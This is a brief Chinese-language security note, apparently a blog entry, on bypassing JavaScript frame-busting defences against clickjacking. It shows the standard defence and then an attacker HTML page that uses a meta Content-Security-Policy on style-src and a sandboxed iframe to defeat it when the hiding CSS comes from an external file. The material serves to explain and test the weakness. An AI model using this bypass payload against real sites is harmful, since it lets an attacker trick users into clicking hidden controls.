# clickjacking js bypass


目前较好的防御方法
```
<head>
<style> body { display : none;} </style>
</head>
<body>
<script>
if (self == top) {
    var theBody = document.getElementsByTagName('body')[0];
    theBody.style.display = "block";
} else {
    top.location = self.location;
}
</script>
```

BUT 某些场景还是可以绕过这个方法,比如下面这个场景

style样式是引入css文件
```
<link href="xx.css"> 
xx.css包含body{display:none;}

```
然而许多前端开发者为了管理方便，都会使用上述代码
接下来我们可以利用csp策略来bypass防御方法
```
attack.html content 

<meta http-equiv="Content-Security-Policy" content="style-src www.leesec.com">

<iframe src="http://10.211.55.8/tset/victim.php" sandbox="allow-modals allow-forms allow-popups allow-scripts allow-same-origin" id="test"></iframe>

```
